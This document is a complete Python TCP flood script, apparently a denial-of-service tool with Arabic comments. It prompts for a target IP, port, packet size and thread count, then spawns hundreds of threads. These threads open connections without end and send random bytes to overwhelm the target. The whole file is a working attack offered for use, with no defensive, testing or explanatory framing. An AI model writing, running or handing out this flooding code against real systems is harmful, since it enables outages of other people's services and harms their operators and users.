import socket
import threading
import random
import os

ip = str(input('[+] Target IP: '))
port = int(input('[+] Target Port: '))
packet_size = int(input('[+] Packet Size (e.g., 1024 or 4096): '))
threads = int(input('[+] Threads Count (e.g., 200 or 500+): '))
per_thread_loops = int(input('[+] Packets per connection (loop count): '))
connections_per_thread = int(input('[+] Connections per thread (e.g., 3 or 5): '))

def generate_payload():
    # بيانات متغيرة بكل اتصال
    return random._urandom(random.randint(int(packet_size * 0.8), packet_size))

def attack():
    while True:
        for _ in range(connections_per_thread):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((ip, port))
                for _ in range(per_thread_loops):
                    payload = generate_payload()
                    s.send(payload)
                s.close()
                print(f"[+] Sent to {ip}:{port}")
            except:
                print(f"[!] Failed to connect to {ip}:{port}")
                try:
                    s.close()
                except:
                    pass

# تشغيل الثريدات
for _ in range(threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

# إبقاء السكربت شغال
while True:
    pass
